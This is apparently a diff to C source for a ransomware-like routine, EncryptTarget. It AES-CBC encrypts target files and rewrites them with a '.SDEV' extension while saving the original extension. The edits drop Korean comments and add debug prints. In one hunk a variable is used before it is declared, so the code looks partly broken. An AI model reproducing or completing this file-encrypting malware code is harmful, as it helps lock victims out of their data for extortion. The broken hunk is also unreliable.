@@ -86,7 +86,6 @@ void EncryptTarget(target* t, unsigned char* key) {
                     AES_CBC_encrypt_buffer(&ctx, in, bytesRead);
 
                     wcscpy(path1, t->file);
-                    //path를 핸들링 해서 .SDEV로 바꾸고 그 path1을
 
                     wchar_t* dotPos = wcsrchr(path1, L'.');
                     wcscpy(t->oex,dotPos);
@@ -94,7 +93,7 @@ void EncryptTarget(target* t, unsigned char* key) {
                         // Replace the file extension with ".SDEV"
                         wcscpy(dotPos, L".SDEV");
                     }
-                    //wcscpy(wcsrchr(path1, L'.'), L".SDEV");
+                    wprintf(L"Original Extension: %s\n", t->oex);
                     printf("path 1 :%S", path1);
 
                     HANDLE wFile = CreateFileW(path1, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -137,7 +136,6 @@ void EncryptTarget(target* t, unsigned char* key) {
                     AES_CBC_encrypt_buffer(&ctx, in, bytesRead);
 
                     wcscpy(path1, t->file);
-                    //path를 핸들링 해서 .SDEV로 바꾸고 그 path1을
 
                     wchar_t* dotPos = wcsrchr(path1, L'.');
                     wcscpy(t->oex,dotPos);
@@ -145,7 +143,7 @@ void EncryptTarget(target* t, unsigned char* key) {
                         // Replace the file extension with ".SDEV"
                         wcscpy(dotPos, L".SDEV");
                     }
-                    //wcscpy(wcsrchr(path1, L'.'), L".SDEV");
+                    wprintf(L"Original Extension: %s\n", t->oex);
                     printf("path 1 :%S", path1);
 
                     HANDLE wFile = CreateFileW(path1, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -186,14 +184,13 @@ void EncryptTarget(target* t, unsigned char* key) {
 
                     wcscpy(path1, t->file);
                     wcscpy(t->oex,dotPos);
-                    //path를 핸들링 해서 .SDEV로 바꾸고 그 path1을
 
                     wchar_t* dotPos = wcsrchr(path1, L'.');
                     if (dotPos) {
                         // Replace the file extension with ".SDEV"
                         wcscpy(dotPos, L".SDEV");
                     }
-                    //wcscpy(wcsrchr(path1, L'.'), L".SDEV");
+                    wprintf(L"Original Extension: %s\n", t->oex);
                     printf("path 1 :%S", path1);
 
                     HANDLE wFile = CreateFileW(path1, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
